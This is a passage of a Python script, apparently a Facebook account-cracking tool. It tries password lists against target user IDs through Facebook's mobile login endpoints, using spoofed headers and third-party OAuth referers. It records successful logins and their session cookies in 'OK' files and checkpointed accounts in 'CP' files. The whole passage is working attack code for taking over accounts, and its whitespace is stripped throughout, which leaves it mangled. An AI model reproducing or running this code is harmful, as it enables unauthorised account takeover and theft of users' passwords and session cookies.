'referer':'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=2916998a1f449ba3ee9407b085e05c4c&response_type=code&sdk=php-sdk-5.7.0&redirect_uri=%2F%2Fwww.kilat.com%2Ffb-callback&scope=email&ret=login&fbapp_pres=0&logger_id=e0e798ae-ef69-48de-a514-1612484d66b2&tp=unspecified&cancel_url=?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=2916998a1f449ba3ee9407b085e05c4c#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'path':'/login/async/wvdp/',
'accept-encoding':'gzip,deflate,br',
'accept-language':'id-ID,id;q=0.9,en-US,en;q=0.9'}
po=ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie':koki},headers=heade,allow_redirects=False)
if"checkpoint"inpo.cookies.get_dict().keys():
print(f'\rID:{kk}{idf}{P}\nPW:{kk}{pw}{P}\nUserAgent:{kk}{ua}{P}\n')
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
akun.append(idf+'|'+pw)
cp+=1
break
elif"c_user"inses.cookies.get_dict().keys():
ok+=1
coki=po.cookies.get_dict()
kuki=(";").join(["%s=%s"%(key,value)forkey,valueinses.cookies.get_dict().items()])
print(f'\rID:{hh}{idf}{P}\nPW:{hh}{pw}{P}\nCookie:{hh}{kuki}{P}\n')
open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
cek_apk(session,coki)
break

else:
continue
exceptrequests.exceptions.ConnectionError:
time.sleep(31)
loop+=1
#----------------------[METHODE-UNIPIN]-----------------#
defcrackunipin(idf,pwv):
globalloop,ok,cp
bi=random.choice(['\33[m'])
pers=loop*100/len(id2)
fff='%'
print('\r%s%s/%sok:%s/cp:%s%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x),end='');sys.stdout.flush()
ua=random.choice(ugen)
ua2=random.choice(ugen)
ses=requests.Session()
forpwinpwv:
try:
ses.headers.update({'Host':'m.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?1','upgrade-insecure-requests':'1','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
p=ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://www.facebook.com/v3.0/dialog/oauth?client_id=1247593455251878&redirect_uri=https%3A%2F%2Fwww.unipin.com%2Ffacebook%2Fcallback&scope=email&response_type=code&state=HhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA&ret=login&fbapp_pres=0&logger_id=850fbda2-7c15-44d1-a322-ce13588bf858&tp=unspecified&cancel_url=https://www.unipin.com/facebook/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=HhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
dataa={"lsd":re.search('name="lsd"value="(.*?)"',str(p.text)).group(1),"jazoest":re.search('name="jazoest"value="(.*?)"',str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e={"init":1651658200978}&sso=chrome_custom_tab&scope=email&state={"0_auth_logger_id":"68f15bae-23f8-463c-8660-5cf1226d97f6","7_challenge":"dahj28hqtietmhrgprpp","3_method":"custom_tab"}&redirect_uri=fbconnect://cct.com.instathunder.app&response_type=token,signed_request,graph_domain,granted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
koki=(";").join(["%s=%s"%(key,value)forkey,valueinp.cookies.get_dict().items()])
koki+='m_pixel_ratio=2.625;wd=412x756'
heade={'Host':'m.facebook.com','cache-control':'max-age=0','sec-ch-ua':'"NotA;Brand";v="99","Chromium";v="98"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','upgrade-insecure-requests':'1','origin':'https://m.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'XMLHttpRequest','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://www.facebook.com/v3.0/dialog/oauth?client_id=1247593455251878&redirect_uri=https%3A%2F%2Fwww.unipin.com%2Ffacebook%2Fcallback&scope=email&response_type=code&state=HhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA&ret=login&fbapp_pres=0&logger_id=850fbda2-7c15-44d1-a322-ce13588bf858&tp=unspecified&cancel_url=https://www.unipin.com/facebook/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=HhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding':'gzip,deflate,br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
po=ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie':koki},headers=heade,allow_redirects=False)
if"checkpoint"inpo.cookies.get_dict().keys():
print(f'\rID:{kk}{idf}{P}\nPW:{kk}{pw}{P}\nUserAgent:{kk}{ua}{P}\n')
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
akun.append(idf+'|'+pw)
cp+=1
break
elif"c_user"inses.cookies.get_dict().keys():
ok+=1
coki=po.cookies.get_dict()
kuki=(";").join(["%s=%s"%(key,value)forkey,valueinses.cookies.get_dict().items()])
print(f'\rID:{hh}{idf}{P}\nPW:{hh}{pw}{P}\nCookie:{hh}{kuki}{P}\n')
open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
cek_apk(session,coki)
break

else:
continue
exceptrequests.exceptions.ConnectionError:
time.sleep(31)
loop+=1
#-----------------------[SYSTEM-CONTROL]--------------------#
if__name__=='__main__':
try:os.system('gitpull')
except:pass
try:os.mkdir('OK')
except:pass
try:os.mkdir('CP')
except:pass
try:os.system('touch.prox.txt')
except:pass
login()
